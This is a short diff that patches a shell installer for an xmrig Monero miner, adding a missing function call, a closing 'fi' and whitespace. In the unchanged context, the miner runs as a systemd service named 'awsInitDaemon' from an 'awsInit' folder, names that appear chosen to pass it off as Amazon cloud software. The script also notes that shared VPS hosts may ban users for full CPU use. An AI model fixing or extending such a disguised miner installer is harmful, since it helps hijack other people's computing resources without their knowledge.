@@ -230,6 +230,8 @@ check_system_libc() {
 #       fi
 #       exit 1
 
+determine_working_dir
+
 echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop awsInitDaemon.service
@@ -292,6 +294,7 @@ else
         fi
         exit 1
     fi
+fi
 
 echo "[*] Miner $working_dir/awsInit/xmrig is OK"
 
@@ -404,6 +407,7 @@ EOL
         fi
     fi
 fi
+
 echo ""
 echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
 if [ "$CPU_THREADS" -lt "4" ]; then
@@ -423,8 +427,3 @@ fi
 echo ""
 
 echo "[*] Setup complete"
-
-
-
-
-
